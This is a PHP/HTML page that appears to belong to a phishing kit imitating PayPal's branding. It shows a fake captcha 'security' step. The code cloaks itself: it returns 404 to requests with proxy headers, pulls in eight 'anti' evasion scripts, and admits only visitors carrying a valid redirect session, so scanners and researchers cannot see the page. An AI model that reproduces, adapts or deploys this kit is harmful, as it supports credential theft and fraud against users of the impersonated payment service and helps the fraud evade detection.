<?php 
  $headers = array('CLIENT_IP','FORWARDED','FORWARDED_FOR','FORWARDED_FOR_IP','VIA','X_FORWARDED','X_FORWARDED_FOR','HTTP_CLIENT_IP','HTTP_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED_FOR_IP','HTTP_PROXY_CONNECTION','HTTP_VIA','HTTP_X_FORWARDED','HTTP_X_FORWARDED_FOR');
  
  foreach ($headers as $header){
    if (isset($_SERVER[$header])) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
  }
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
if(!isset($_SESSION['language'])){
	exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
	$_SESSION['captcha'] = "secure";
}
	?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<link rel="shortcut icon" href="lib/img/fav.ico" />
	<link rel="apple-touch-icon" href="lib/img/ticon.png" />
	<script src="lib/js/jquery.min.js"></script>
	<script type="text/javascript">$('.loaderOverlay').fadeIn();setTimeout(function(){$('.loaderOverlay').fadeOut();},3500);</script>
	<link rel="stylesheet" href="lib/css/xappx.css" />
	<title><?php echo $lg_captcha['title']?></title>
</head>
<body>
	<div class="contentContainer" id="content">
		<div class="safeComponent" data-nemo="safeStartPage"> 
			<header><div class="xysx-logo"></div> </header>
			<h1><?php echo $lg_captcha['head']?></h1>
		<div class="safeDescription">
	<p class="description"><?php echo $lg_captcha['body']?>.</p></div> 
<html>
<div>
	<head>
		<link rel="stylesheet" href="lib/css/custom.css"> 
		<!-- The directory of the CSS file --> 
		<script type="text/javascript" src="signin.js"></script>
		<!-- The directory of the JS file --><title> </title>
	</head>
<body onLoad="ChangeCaptcha()">
	<!-- As the body loads, the function runs and Captcha is loaded. -->
	<input type="text" disabled="disabled" id="randomfield">
	<!-- Change this ID to the desired one, be sure to change it in the CSS and JS files too -->
	<br>
	<br>
	<input style="height: 44px;
    width: 100%;
    border: 1px solid #9da3a6;
    background: #fff;
    text-overflow: ellipsis;
    border-radius: 4px;
    box-shadow: none;
    font-size: 1em;
    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
    font-weight: 400;
    direction: ltr;
    box-sizing: border-box;
    -webkit-appearance: textfield;
    background-color: white;
    cursor: text;
    padding: 1px;
    border-width: 2px;
    border-style: inset;
    border-color: initial;
    border-image: initial;
    text-rendering: auto;
    color: initial;
    letter-spacing: normal;
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: start;
    margin: 0em;
    font: 400 13.3333px Arial;
    -webkit-writing-mode: horizontal-tb !important;" placeholder="<?php echo $lg_captcha['code']?>" id="CaptchaEnter" size="20" maxlength="6" />
	<!-- Change maxlength to the size you wanted your Captcha to be -->
	<br>
	<button onclick="check()" type="submit" id="xyssubmitsecx" name="safeContinueButton" class="button safeContinueButton primary" value="<?php echo $lg_captcha['bt_secure']?>"><?php echo $lg_captcha['bt_secure']?></button>
	<!-- The function is executed when the user presses this button -->
</body>
</div>
</div>
<div class="loaderOverlayAdditionalElements"></div>
</div>
<div class="modal-overlay"></div></div></div> 
<footer class="footer" role="contentinfo">
	<div class="legalFooter"><ul class="footerGroup">
		<li> <a href="#"><?php echo $lg_sign['footer']['contact']?></a></li>
		<li> <a href="#"><?php echo $lg_sign['footer']['privacy']?></a></li>
		<li> <a href="#"><?php echo $lg_sign['footer']['legal']?></a></li>
		<li> <a href="#"><?php echo $lg_sign['footer']['world']?></a></li>
	</ul>
</div> 
</footer> 
<script src="lib/js/xsecx.js"></script>
</body>
</html>